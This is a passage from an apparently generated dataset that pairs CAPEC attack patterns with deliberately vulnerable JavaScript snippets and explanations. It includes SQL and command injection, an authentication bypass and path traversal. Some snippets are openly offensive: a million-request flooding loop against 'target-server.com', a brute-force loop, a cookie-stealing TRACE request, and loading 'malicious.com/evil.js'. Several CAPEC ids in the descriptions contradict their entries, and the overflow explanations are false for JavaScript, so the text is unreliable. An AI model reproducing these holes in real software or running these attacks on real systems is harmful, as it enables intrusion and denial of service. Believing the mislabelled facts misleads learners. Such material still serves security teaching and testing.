        "code_snippet": "function loadContent(url) {\n    if (!url.startsWith('http://trusted.com')) {\n        alert('Untrusted source!');\n        return;\n    }\n    var iframe = document.createElement('iframe');\n    iframe.src = url;\n    document.body.appendChild(iframe);\n}\n\n// Example usage\nloadContent('http://malicious.com/evil.js');",
        "description": "This JavaScript code snippet demonstrates a vulnerable function `loadContent` that loads content into an iframe based on a provided URL. The function attempts to check if the URL starts with 'http://trusted.com', but this check is insufficient and can be easily bypassed. This represents CWE-285 (Improper Authorization) as it does not correctly authorize the source of the content. Additionally, the function does not properly validate the input URL (CWE-20), and it does not encode or escape the URL (CWE-116), which could lead to Cross Zone Scripting attacks. The code snippet embodies the main idea of CAPEC-160 (Cross Zone Scripting) by showing how an attacker could exploit insufficient security checks to load malicious content, potentially bypassing security zones and gaining elevated privileges."
    },
    {
        "capec_id": "105",
        "capec_name": "HTTP Request Splitting",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  let userInput = req.url.split('?')[1];\n  if (userInput) {\n    // Vulnerable to HTTP Request Splitting\n    res.setHeader('Set-Cookie', `sessionId=abc123; path=/; ${userInput}`);\n  }\n  res.end('Hello World');\n}).listen(8080, () => console.log('Server running on port 8080'));\n",
        "description": "This JavaScript code snippet creates an HTTP server using Node.js. The server extracts user input from the URL query string and uses it directly in the 'Set-Cookie' HTTP header without proper sanitization. This makes the code vulnerable to HTTP Request Splitting (CAPEC-33) and related weaknesses such as CWE-113 (Improper Neutralization of CRLF Sequences in HTTP Headers) and CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component). An attacker could exploit this vulnerability by injecting CRLF sequences into the user input, causing the server to split the HTTP response into multiple responses, potentially leading to unauthorized actions or information disclosure."
    },
    {
        "capec_id": "106",
        "capec_name": "DEPRECATED: XSS through Log Files",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst fs = require('fs');\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/submit', (req, res) => {\n  const userInput = req.body.userInput;\n  // Log user input to a file\n  fs.appendFile('server.log', `User Input: ${userInput}\\n`, (err) => {\n    if (err) throw err;\n  });\n  // Reflect user input back to the user\n  res.send(`<html><body>User Input: ${userInput}</body></html>`);\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable Express.js application that logs user input to a file and reflects it back to the user without proper sanitization. The user input is logged to 'server.log' and then included in the HTML response. This can lead to Cross-Site Scripting (XSS) attacks if an attacker submits malicious scripts as input. The code embodies the main idea of the deprecated CAPEC 'XSS through Log Files' by showing how improper handling of user input in logs and web pages can lead to security vulnerabilities. The related CWEs highlight the risks of incomplete denylist-based protection (CWE-692), improper neutralization of input (CWE-79), and exposure through log files (CWE-532)."
    },
    {
        "capec_id": "107",
        "capec_name": "Cross Site Tracing",
        "code_snippet": "const xhr = new XMLHttpRequest();\nxhr.open('TRACE', 'https://example.com', true);\nxhr.onreadystatechange = function() {\n  if (xhr.readyState === 4 && xhr.status === 200) {\n    console.log(xhr.responseText);\n  }\n};\nxhr.send();",
        "description": "This JavaScript code snippet demonstrates a Cross Site Tracing (XST) attack. It sends an HTTP TRACE request to 'https://example.com'. If the server supports the TRACE method, it will echo back the request headers, including any cookies or authentication tokens. The response is then logged to the console, potentially exposing sensitive information. This snippet embodies the main idea of CAPEC-111 by exploiting the TRACE method to capture session cookies and other credentials. The related CWEs provide context on the types of vulnerabilities that can be exploited in conjunction with XST, such as improper neutralization of input (CWE-79) and protection mechanism failures (CWE-693)."
    },
    {
        "capec_id": "108",
        "capec_name": "Command Line Execution through SQL Injection",
        "code_snippet": "const express = require('express');\nconst mysql = require('mysql');\nconst { exec } = require('child_process');\nconst app = express();\nconst connection = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: 'password',\n  database: 'test'\n});\n\napp.get('/execute', (req, res) => {\n  const userInput = req.query.input;\n  const query = `SELECT command FROM commands WHERE id = '${userInput}'`;\n\n  connection.query(query, (error, results) => {\n    if (error) throw error;\n    const command = results[0].command;\n    exec(command, (err, stdout, stderr) => {\n      if (err) {\n        res.send(`Error: ${stderr}`);\n        return;\n      }\n      res.send(`Output: ${stdout}`);\n    });\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a web application using Express and MySQL that is vulnerable to command line execution through SQL injection. The application takes user input from a query parameter, constructs an SQL query without proper input validation, and retrieves a command from the database. This command is then executed on the server using the `exec` function from the `child_process` module. The code embodies the main idea of CAPEC-123: 'Command Line Execution through SQL Injection', and highlights related weaknesses such as SQL Injection (CWE-89), OS Command Injection (CWE-78), and Improper Input Validation (CWE-20)."
    },
    {
        "capec_id": "109",
        "capec_name": "Object Relational Mapping Injection",
        "code_snippet": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst { Sequelize, DataTypes } = require('sequelize');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst sequelize = new Sequelize('database', 'username', 'password', {\n  host: 'localhost',\n  dialect: 'mysql'\n});\n\nconst User = sequelize.define('User', {\n  username: {\n    type: DataTypes.STRING,\n    allowNull: false\n  },\n  password: {\n    type: DataTypes.STRING,\n    allowNull: false\n  }\n});\n\napp.post('/login', async (req, res) => {\n  const { username, password } = req.body;\n  try {\n    const user = await sequelize.query(`SELECT * FROM Users WHERE username = '${username}' AND password = '${password}'`, {\n      type: sequelize.QueryTypes.SELECT\n    });\n    if (user.length > 0) {\n      res.send('Login successful');\n    } else {\n      res.send('Invalid credentials');\n    }\n  } catch (error) {\n    res.status(500).send('Internal Server Error');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable implementation of a login endpoint using Express.js and Sequelize ORM. The code takes user input from a POST request and directly interpolates it into a raw SQL query, which is executed against a MySQL database. This approach is susceptible to SQL Injection attacks because it does not properly neutralize special elements in the user input. An attacker could manipulate the 'username' or 'password' fields to alter the SQL query's logic, potentially gaining unauthorized access to the system. This example embodies the main idea of CAPEC-20 (Object Relational Mapping Injection) and highlights related weaknesses such as CWE-89 (SQL Injection) and CWE-564 (SQL Injection: Hibernate)."
    },
    {
        "capec_id": "110",
        "capec_name": "SQL Injection through SOAP Parameter Tampering",
        "code_snippet": "const soap = require('soap');\nconst mysql = require('mysql');\n\nconst service = {\n  MyService: {\n    MyPort: {\n      MyFunction: function(args) {\n        const connection = mysql.createConnection({\n          host: 'localhost',\n          user: 'root',\n          password: 'password',\n          database: 'mydb'\n        });\n\n        connection.connect();\n\n        // Vulnerable SQL query construction\n        const query = `SELECT * FROM users WHERE username = '${args.username}' AND password = '${args.password}'`;\n\n        connection.query(query, function(error, results, fields) {\n          if (error) throw error;\n          console.log(results);\n        });\n\n        connection.end();\n      }\n    }\n  }\n};\n\nconst xml = require('fs').readFileSync('myservice.wsdl', 'utf8');\nsoap.listen(server, '/wsdl', service, xml);",
        "description": "This JavaScript code snippet demonstrates a SOAP-based web service that is vulnerable to SQL Injection through SOAP Parameter Tampering. The service receives SOAP messages containing 'username' and 'password' parameters, which are directly used to construct an SQL query without proper validation or parameter binding. This allows an attacker to inject malicious SQL code through the SOAP parameters, potentially compromising the database. The code highlights CWE-89 (SQL Injection), CWE-20 (Improper Input Validation), and CWE-209 (Generation of Error Message Containing Sensitive Information) by showing how improper handling of input can lead to security vulnerabilities."
    },
    {
        "capec_id": "111",
        "capec_name": "JSON Hijacking (aka JavaScript Hijacking)",
        "code_snippet": "function fetchData() {\n  var script = document.createElement('script');\n  script.src = 'https://vulnerable-site.com/data.json';\n  document.body.appendChild(script);\n}\n\nfetchData();\n\nfunction handleData(data) {\n  console.log('Received data:', data);\n}\n\n// Vulnerable JSONP endpoint\n// https://vulnerable-site.com/data.json?callback=handleData",
        "description": "This JavaScript code snippet demonstrates a JSON Hijacking vulnerability. The `fetchData` function dynamically creates a script element that loads a JSONP endpoint from 'https://vulnerable-site.com/data.json'. The server responds with a JSON object wrapped in a callback function, `handleData`, which is executed in the context of the attacker's site. This allows the attacker to steal sensitive information from the JSON response. The code embodies the main idea of JSON Hijacking by exploiting the browser's Same Origin Policy loophole, and it is related to several CWEs: insufficient verification of data authenticity (CWE-345), origin validation error (CWE-346), and client-side enforcement of server-side security (CWE-602)."
    },
    {
        "capec_id": "112",
        "capec_name": "Brute Force",
        "code_snippet": "const users = { 'user1': 'password123', 'user2': 'password456' }; // CWE-521\n\nfunction authenticate(username, password) {\n  if (users[username] && users[username] === password) {\n    return 'Access granted';\n  } else {\n    return 'Access denied';\n  }\n}\n\n// Simulate brute force attack\nconst usernames = ['user1', 'user2'];\nconst passwords = ['password123', 'password456', 'password789']; // CWE-307\n\nfor (let i = 0; i < usernames.length; i++) {\n  for (let j = 0; j < passwords.length; j++) {\n    console.log(`Trying ${usernames[i]}:${passwords[j]}`);\n    console.log(authenticate(usernames[i], passwords[j]));\n  }\n}",
        "description": "This JavaScript code snippet demonstrates a simple authentication mechanism that is vulnerable to brute force attacks. The 'users' object stores usernames and their corresponding passwords, which are weak (CWE-521). The 'authenticate' function checks if the provided username and password match the stored values. The code then simulates a brute force attack by iterating through a list of usernames and passwords, attempting to authenticate each combination (CWE-307). This illustrates the main idea of the CAPEC, where an attacker uses trial-and-error to exhaustively explore possible secret values to gain unauthorized access."
    },
    {
        "capec_id": "113",
        "capec_name": "Interface Manipulation",
        "code_snippet": "const fs = require('fs');\n\n// Vulnerable function that manipulates file system interface\nfunction manipulateFileSystem(filePath) {\n  // Improper access control: allowing arbitrary file read/write\n  fs.writeFileSync(filePath, 'Injected content');\n  console.log('File content manipulated');\n}\n\n// Example usage\nmanipulateFileSystem('/etc/passwd');",
        "description": "This JavaScript code snippet demonstrates a vulnerable function that manipulates the file system interface, embodying the main idea of CAPEC-225 (Interface Manipulation). The function `manipulateFileSystem` takes a file path as an argument and writes arbitrary content to the specified file without proper access control. This represents CWE-1262 (Improper Access Control for Register Interface) and CWE-782 (Exposed IOCTL with Insufficient Access Control), as it allows unauthorized manipulation of critical system files. The example usage shows how an attacker could exploit this vulnerability to manipulate the `/etc/passwd` file, potentially compromising the system's security."
    },
    {
        "capec_id": "114",
        "capec_name": "Authentication Abuse",
        "code_snippet": "const users = { 'admin': 'password123' }; // CWE-287: Improper Authentication\n\nfunction authenticate(username, password) {\n  if (users[username] && users[username] === password) {\n    return true;\n  }\n  return false;\n}\n\nfunction login(username, password) {\n  if (authenticate(username, password)) {\n    console.log('Access granted');\n  } else {\n    console.log('Access denied');\n  }\n}\n\n// CWE-307: No restriction on excessive authentication attempts\nfor (let i = 0; i < 1000; i++) {\n  login('admin', 'password123');\n}\n\n// CWE-305: Authentication Bypass by Primary Weakness\nfunction bypassAuthentication() {\n  console.log('Access granted');\n}\n\nbypassAuthentication();",
        "description": "This JavaScript code snippet demonstrates several vulnerabilities related to authentication abuse. The `authenticate` function checks if the provided username and password match the stored credentials (CWE-287: Improper Authentication). The `login` function logs the user in if authentication is successful. However, there is no restriction on the number of authentication attempts (CWE-307: Improper Restriction of Excessive Authentication Attempts), making it susceptible to brute force attacks. Additionally, the `bypassAuthentication` function represents a scenario where an attacker can bypass the authentication mechanism entirely due to a primary weakness (CWE-305: Authentication Bypass by Primary Weakness). This code embodies the main idea of CAPEC-115: Authentication Abuse, where an attacker exploits weaknesses in the authentication mechanism to gain unauthorized access."
    },
    {
        "capec_id": "115",
        "capec_name": "Authentication Bypass",
        "code_snippet": "const express = require('express');\nconst app = express();\n\n// Middleware to check for authentication\napp.use((req, res, next) => {\n  if (req.query.authToken === 'valid-token') {\n    next();\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\n// Vulnerable endpoint that bypasses authentication\napp.get('/admin', (req, res) => {\n  if (req.query.bypass === 'true') {\n    res.send('Access granted to admin panel');\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server with an authentication mechanism. The middleware checks for a valid 'authToken' query parameter to grant access. However, the '/admin' endpoint contains a vulnerability that allows authentication bypass if the 'bypass' query parameter is set to 'true'. This represents the CAPEC 'Authentication Bypass' by demonstrating how an attacker can circumvent the authentication mechanism using an alternate path or channel (CWE-288). The code also highlights improper authentication (CWE-287) and weak authentication (CWE-1390) by relying on easily guessable query parameters for access control."
    },
    {
        "capec_id": "116",
        "capec_name": "Excavation",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// CWE-426: Untrusted Search Path\nconst userProvidedPath = process.argv[2];\nconst sensitiveFilePath = path.join(userProvidedPath, 'sensitive_info.txt');\n\n// CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\nfs.readFile(sensitiveFilePath, 'utf8', (err, data) => {\n  if (err) {\n    console.error('Error reading file:', err);\n    return;\n  }\n  console.log('Sensitive Information:', data);\n});\n\n// CWE-1243: Sensitive Non-Volatile Information Not Protected During Debug\nif (process.env.DEBUG) {\n  console.log('Debug Mode: Sensitive information access is not restricted.');\n  console.log('Sensitive Information:', data);\n}",
        "description": "This JavaScript code snippet demonstrates a scenario where an adversary can exploit the system to gain access to sensitive information. The code reads a sensitive file from a user-provided path (CWE-426: Untrusted Search Path), potentially exposing sensitive information to unauthorized actors (CWE-200: Exposure of Sensitive Information to an Unauthorized Actor). Additionally, if the application is running in debug mode, it prints sensitive information to the console without restriction (CWE-1243: Sensitive Non-Volatile Information Not Protected During Debug). This embodies the CAPEC concept of 'Excavation,' where an adversary probes the system to extract sensitive information for malicious purposes."
    },
    {
        "capec_id": "117",
        "capec_name": "Interception",
        "code_snippet": "const http = require('http');\n\nconst options = {\n  hostname: 'example.com',\n  port: 80,\n  path: '/login',\n  method: 'POST',\n  headers: {\n    'Content-Type': 'application/x-www-form-urlencoded'\n  }\n};\n\nconst req = http.request(options, (res) => {\n  let data = '';\n  res.on('data', (chunk) => {\n    data += chunk;\n  });\n  res.on('end', () => {\n    console.log('Response:', data);\n  });\n});\n\nreq.on('error', (e) => {\n  console.error(`Problem with request: ${e.message}`);\n});\n\n// Sending sensitive information in cleartext\nconst postData = 'username=admin&password=secret';\nreq.write(postData);\nreq.end();",
        "description": "This JavaScript code snippet demonstrates a basic HTTP POST request to a server, sending sensitive information (username and password) in cleartext. This embodies the main idea of CAPEC-157 (Interception) by illustrating how an adversary could intercept sensitive data transmitted over an unencrypted channel. The code is vulnerable to CWE-319 (Cleartext Transmission of Sensitive Information) because it sends the username and password without encryption, making it easy for an attacker to sniff the network traffic and capture these credentials. The code also touches on CWE-924 (Improper Enforcement of Message Integrity During Transmission) as it does not ensure the integrity of the message during transmission, leaving it susceptible to tampering."
    },
    {
        "capec_id": "120",
        "capec_name": "Double Encoding",
        "code_snippet": "function isValidInput(input) {\n  // Incomplete list of disallowed inputs\n  const disallowed = ['<', '>', '\"', \"'\", '..', '%2E'];\n  // Check for disallowed inputs\n  for (let i = 0; i < disallowed.length; i++) {\n    if (input.includes(disallowed[i])) {\n      return false;\n    }\n  }\n  // Validate input before filtering\n  if (!/^[a-zA-Z0-9%]+$/.test(input)) {\n    return false;\n  }\n  // Improper handling of double encoding\n  const decodedInput = decodeURIComponent(input);\n  if (decodedInput.includes('..')) {\n    return false;\n  }\n  return true;\n}\n\n// Example usage\nconst userInput = '%252E%252E%252Fetc%252Fpasswd';\nconsole.log(isValidInput(userInput)); // Expected to be false, but returns true",
        "description": "This JavaScript code snippet demonstrates a function `isValidInput` that attempts to validate user input against a list of disallowed characters and patterns. The function first checks the input against an incomplete list of disallowed inputs, which includes common special characters and a single URL-encoded dot (`%2E`). It then performs a validation check using a regular expression to ensure the input contains only alphanumeric characters and percent signs. Finally, it decodes the input once and checks for the presence of a double dot (`..`), which is often used in path traversal attacks. The example usage shows how a doubly encoded input (`%252E%252E%252Fetc%252Fpasswd`) can bypass the initial checks and be incorrectly validated as safe, illustrating the vulnerability described in the CAPEC. This code snippet embodies the main idea of double encoding attacks and highlights related weaknesses such as improper handling of alternate encoding, incomplete disallowed input lists, and incorrect validation order."
    },
    {
        "capec_id": "121",
        "capec_name": "Exploit Non-Production Interfaces",
        "code_snippet": "const express = require('express');\nconst app = express();\n\n// Debug mode flag\nconst debugMode = true;\n\n// Sample debug endpoint\nif (debugMode) {\n  app.get('/debug-info', (req, res) => {\n    // Exposing sensitive information for debugging purposes\n    res.send({\n      secretKey: '12345-ABCDE',\n      dbConnectionString: 'mongodb://user:password@localhost:27017/db',\n      debugData: 'Sensitive debug information'\n    });\n  });\n}\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet represents a common vulnerability where a debug interface is unintentionally left enabled in a production environment. The code uses the Express framework to create a web server with a debug endpoint (`/debug-info`) that exposes sensitive information such as a secret key, database connection string, and other debug data. This embodies the main idea of CAPEC-Non-Production Interfaces and related CWEs like Active Debug Code (CWE-489) and Debug Messages Revealing Unnecessary Information (CWE-1295). An adversary could exploit this endpoint to gain unauthorized access to sensitive information."
    },
    {
        "capec_id": "122",
        "capec_name": "Privilege Abuse",
        "code_snippet": "const express = require('express');\nconst app = express();\n\n// Mock user data\nconst users = [\n  { id: 1, username: 'admin', role: 'admin' },\n  { id: 2, username: 'user', role: 'user' }\n];\n\n// Mock sensitive data\nconst sensitiveData = 'This is sensitive data only for admins.';\n\n// Middleware to check if user is authenticated\nfunction isAuthenticated(req, res, next) {\n  const userId = req.headers['user-id'];\n  req.user = users.find(user => user.id == userId);\n  if (req.user) {\n    next();\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n}\n\n// Route to access sensitive data\napp.get('/sensitive-data', isAuthenticated, (req, res) => {\n  // Improper access control: sensitive data exposed to non-admin users\n  res.send(sensitiveData);\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server. It includes a mock user database and a piece of sensitive data that should only be accessible to admin users. The `isAuthenticated` middleware checks if a user is authenticated based on a user ID provided in the request headers. However, the route `/sensitive-data` improperly exposes sensitive data to any authenticated user, regardless of their role. This demonstrates the CAPEC concept of 'Privilege Abuse' by allowing lower-privileged users to access resources meant for higher-privileged users. The code embodies CWE-269 (Improper Privilege Management) and CWE-284 (Improper Access Control) by not properly checking the user's role before granting access to the sensitive data."
    },
    {
        "capec_id": "123",
        "capec_name": "Buffer Manipulation",
        "code_snippet": "function vulnerableFunction(input) {\n  var buffer = new Array(10).fill(0);\n  for (var i = 0; i <= input.length; i++) {\n    buffer[i] = input.charCodeAt(i);\n  }\n  return buffer;\n}\n\n// Example usage\nvar userInput = 'A very long input string that exceeds buffer size';\nconsole.log(vulnerableFunction(userInput));",
        "description": "This JavaScript code snippet demonstrates a buffer manipulation vulnerability, specifically a buffer overflow (CWE-119). The function `vulnerableFunction` takes an input string and attempts to store its character codes into a fixed-size buffer of 10 elements. The loop iterates over the length of the input string, which can exceed the buffer's allocated size, leading to an out-of-bounds write. This can result in overwriting adjacent memory, potentially causing unexpected behavior or security vulnerabilities. The code embodies the main idea of CAPEC-1000 by manipulating the buffer in a way that can lead to reading or writing outside its intended boundaries."
    },
    {
        "capec_id": "124",
        "capec_name": "Shared Resource Manipulation",
        "code_snippet": "const fs = require('fs');\n\nlet sharedResource = 0;\n\nfunction readSharedResource() {\n  return sharedResource;\n}\n\nfunction writeSharedResource(value) {\n  sharedResource = value;\n}\n\nfunction simulateRaceCondition() {\n  for (let i = 0; i < 1000; i++) {\n    setTimeout(() => {\n      let value = readSharedResource();\n      writeSharedResource(value + 1);\n    }, Math.random() * 100);\n  }\n}\n\nsimulateRaceCondition();",
        "description": "This JavaScript code snippet demonstrates a race condition vulnerability, which is a form of shared resource manipulation. The shared resource here is a simple variable 'sharedResource' that is accessed and modified by multiple asynchronous operations without proper synchronization. The 'simulateRaceCondition' function creates a scenario where multiple threads (simulated using setTimeout) read and write to the shared resource concurrently, leading to potential data corruption. This example embodies the main idea of CAPEC-23 (Shared Resource Manipulation) and highlights CWE-662 (Improper Synchronization) by showing how improper handling of shared resources can lead to unpredictable behavior and potential security issues."
    },
    {
        "capec_id": "125",
        "capec_name": "Flooding",
        "code_snippet": "const http = require('http');\n\nconst options = {\n  hostname: 'target-server.com',\n  port: 80,\n  path: '/',\n  method: 'GET'\n};\n\nfor (let i = 0; i < 1000000; i++) {\n  const req = http.request(options, res => {\n    res.on('data', d => {});\n  });\n\n  req.on('error', error => {\n    console.error(error);\n  });\n\n  req.end();\n}",
        "description": "This JavaScript code snippet demonstrates a basic flooding attack using HTTP requests. The code repeatedly sends a large number of GET requests to a target server ('target-server.com') in a loop. This can overwhelm the server's resources, leading to potential denial of service for legitimate users. The code embodies the main idea of CAPEC-404 (Flooding) by rapidly engaging in a large number of interactions with the target. It also touches on related CWEs such as CWE-770 (Allocation of Resources Without Limits or Throttling) and CWE-400 (Uncontrolled Resource Consumption) by not imposing any restrictions on the number of requests sent, thereby consuming the target's resources."
    },
    {
        "capec_id": "126",
        "capec_name": "Path Traversal",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\nconst path = require('path');\n\nconst server = http.createServer((req, res) => {\n  const basePath = path.join(__dirname, 'restricted');\n  const requestedPath = path.join(basePath, req.url);\n\n  fs.readFile(requestedPath, (err, data) => {\n    if (err) {\n      res.writeHead(404, {'Content-Type': 'text/plain'});\n      res.end('File not found');\n    } else {\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end(data);\n    }\n  });\n});\n\nserver.listen(3000, () => {\n  console.log('Server running at http://localhost:3000/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server reads files from a 'restricted' directory based on the URL requested by the client. The code constructs the file path by joining the base directory path with the requested URL path. However, it does not properly validate or sanitize the input path, making it vulnerable to path traversal attacks. An attacker could exploit this by sending requests with '../' sequences to access files outside the 'restricted' directory, potentially exposing sensitive files on the server."
    },
    {
        "capec_id": "127",
        "capec_name": "Directory Indexing",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\nconst path = require('path');\n\nconst server = http.createServer((req, res) => {\n  const filePath = path.join(__dirname, req.url);\n\n  fs.stat(filePath, (err, stats) => {\n    if (err) {\n      res.writeHead(404, { 'Content-Type': 'text/plain' });\n      res.end('Not Found');\n      return;\n    }\n\n    if (stats.isDirectory()) {\n      fs.readdir(filePath, (err, files) => {\n        if (err) {\n          res.writeHead(500, { 'Content-Type': 'text/plain' });\n          res.end('Server Error');\n          return;\n        }\n\n        res.writeHead(200, { 'Content-Type': 'text/plain' });\n        res.end(files.join('\\n'));\n      });\n    } else {\n      fs.readFile(filePath, (err, content) => {\n        if (err) {\n          res.writeHead(500, { 'Content-Type': 'text/plain' });\n          res.end('Server Error');\n          return;\n        }\n\n        res.writeHead(200, { 'Content-Type': 'text/plain' });\n        res.end(content);\n      });\n    }\n  });\n});\n\nserver.listen(3000, () => {\n  console.log('Server running at http://localhost:3000/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server responds to requests by checking if the requested path is a directory. If it is, the server lists the contents of the directory. If the path is a file, the server reads and returns the file's content. This code embodies the main idea of the CAPEC 'Directory Indexing' by potentially exposing directory contents to unauthorized users. The related CWEs are represented as follows:\n- CWE-424: The code does not protect alternate paths, allowing directory listing.\n- CWE-425: The code does not enforce authorization checks on directory access.\n- CWE-288: The code does not require authentication for accessing directory contents.\n- CWE-285: The code does not perform authorization checks for accessing resources.\n- CWE-732: The code may expose critical resources by listing directory contents.\n- CWE-276: The default permissions may allow unintended access to files.\n- CWE-693: The code lacks protection mechanisms to prevent directory indexing."
    },
    {
        "capec_id": "128",
        "capec_name": "Integer Attacks",
        "code_snippet": "function processInput(input) {\n  let maxInt = 2147483647; // Maximum value for a 32-bit signed integer\n  let result = input + 1;\n\n  if (result > maxInt) {\n    console.log('Integer overflow detected!');\n    return;\n  }\n\n  // Further processing with the result\n  console.log('Processed result:', result);\n}\n\nlet userInput = 2147483647; // Simulating user input\nprocessInput(userInput);",
        "description": "This JavaScript code snippet demonstrates an integer overflow vulnerability. The function `processInput` takes an integer input and adds 1 to it. If the input is the maximum value for a 32-bit signed integer (2147483647), adding 1 causes an integer overflow, resulting in an unexpected negative value. The code checks for overflow by comparing the result to the maximum integer value, but this check is performed after the overflow has already occurred, making it ineffective. This snippet embodies the main idea of CAPEC's 'Integer Attacks' by showing how an attacker can exploit integer overflow to cause unexpected behavior. The related CWEs are represented by the incorrect calculation (CWE-682), lack of minimum check (CWE-839), integer overflow (CWE-190), and potential sign extension issues (CWE-194)."
    },
    {
        "capec_id": "129",
        "capec_name": "Pointer Manipulation",
        "code_snippet": "function vulnerableFunction(input) {\n  let buffer = new ArrayBuffer(8);\n  let view = new DataView(buffer);\n  let pointer = input;\n\n  // CWE-823: Use of Out-of-range Pointer Offset\n  if (pointer < 0 || pointer >= buffer.byteLength) {\n    console.log('Pointer out of range');\n    return;\n  }\n\n  // CWE-822: Untrusted Pointer Dereference\n  try {\n    let value = view.getInt32(pointer, true);\n    console.log('Value at pointer:', value);\n  } catch (e) {\n    console.log('Error dereferencing pointer:', e);\n  }\n}\n\n// Example usage\nvulnerableFunction(10); // Out of range pointer\nvulnerableFunction(-1); // Out of range pointer\nvulnerableFunction(4); // Valid pointer",
        "description": "This JavaScript code snippet demonstrates a vulnerable function that manipulates a pointer based on user input. The function creates an ArrayBuffer and a DataView to access the buffer's memory. It then takes an input value and uses it as a pointer to read an integer from the buffer. The code checks if the pointer is within the valid range of the buffer (CWE-823) and attempts to dereference it (CWE-822). If the pointer is out of range, it logs an error message. This example embodies the main idea of the CAPEC by showing how manipulating a pointer can lead to accessing unintended memory locations, potentially causing crashes or unauthorized data access."
    },
    {
        "capec_id": "130",
        "capec_name": "Excessive Allocation",
        "code_snippet": "function allocateExcessiveMemory(size) {\n  let arr = [];\n  try {\n    for (let i = 0; i < size; i++) {\n      arr.push(new Array(1e6).fill('A'));\n    }\n  } catch (e) {\n    console.error('Memory allocation failed:', e);\n  }\n}\n\n// Example usage: allocateExcessiveMemory(1000);",
        "description": "This JavaScript code snippet demonstrates an excessive allocation attack by allocating a large amount of memory in a loop. The function `allocateExcessiveMemory` takes a parameter `size` which determines the number of large arrays (each with 1 million elements) to be allocated. This can lead to memory exhaustion, thereby reducing the resources available for legitimate services. The code embodies the main idea of CAPEC-130 (Excessive Allocation) by causing the target to allocate excessive resources through a single or a small number of requests. The related CWEs are represented as follows: CWE-770 (Allocation of Resources Without Limits or Throttling) is shown by the lack of any checks or limits on the size parameter, CWE-400 (Uncontrolled Resource Consumption) is demonstrated by the uncontrolled allocation of memory, and CWE-1325 (Improperly Controlled Sequential Memory Allocation) is represented by the sequential allocation of large arrays without proper limits."
    },
    {
        "capec_id": "131",
        "capec_name": "Resource Leak Exposure",
        "code_snippet": "const fs = require('fs');\n\nfunction readFile(filePath) {\n  let fileHandle;\n  try {\n    fileHandle = fs.openSync(filePath, 'r');\n    const data = fs.readFileSync(fileHandle, 'utf8');\n    console.log(data);\n  } catch (err) {\n    console.error('Error reading file:', err);\n  } finally {\n    // Improper resource shutdown or release\n    // Missing release of resource after effective lifetime\n    // fs.closeSync(fileHandle); // This line is commented out, causing a resource leak\n  }\n}\n\n// Example usage\nreadFile('example.txt');",
        "description": "This JavaScript code snippet demonstrates a resource leak vulnerability by not properly releasing a file handle after its use. The `readFile` function opens a file and reads its contents, but the file handle is not closed in the `finally` block, leading to a resource leak. This embodies the CAPEC 'Resource Leak Exposure' by depleting the file handles available to the system, potentially affecting legitimate requests. The related CWEs are represented as follows: CWE-404 (Improper Resource Shutdown or Release) and CWE-772 (Missing Release of Resource after Effective Lifetime). The commented-out line `fs.closeSync(fileHandle);` indicates the correct way to release the resource, highlighting the vulnerability."
    },
    {
        "capec_id": "132",
        "capec_name": "Symlink Attack",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction readFile(filePath) {\n  fs.readFile(filePath, 'utf8', (err, data) => {\n    if (err) {\n      console.error('Error reading file:', err);\n      return;\n    }\n    console.log('File content:', data);\n  });\n}\n\nconst userInputPath = '/tmp/user_input';\nreadFile(userInputPath);",
        "description": "This JavaScript code snippet demonstrates a potential vulnerability to a symlink attack. The `readFile` function takes a file path and reads its content. The `userInputPath` variable is set to a path that could be controlled by an attacker. If an attacker creates a symbolic link at `/tmp/user_input` pointing to a sensitive file, the `readFile` function will follow the symlink and read the content of the unintended file. This embodies the main idea of the CAPEC by showing how improper link resolution and external control of file paths can lead to unauthorized file access."
    },
    {
        "capec_id": "133",
        "capec_name": "Try All Common Switches",
        "code_snippet": "const args = process.argv.slice(2);\nconst knownSwitches = ['--help', '--version', '--verbose'];\nconst hiddenSwitches = ['--debug', '--admin', '--config'];\n\nargs.forEach(arg => {\n  if (knownSwitches.includes(arg)) {\n    console.log(`Executing known switch: ${arg}`);\n  } else if (hiddenSwitches.includes(arg)) {\n    console.log(`Executing hidden switch: ${arg}`);\n    // Potentially sensitive information or functionality\n    if (arg === '--debug') {\n      console.log('Debugging information: ...');\n    } else if (arg === '--admin') {\n      console.log('Admin mode activated');\n    } else if (arg === '--config') {\n      console.log('Configuration details: ...');\n    }\n  } else {\n    console.log(`Unknown switch: ${arg}`);\n  }\n});",
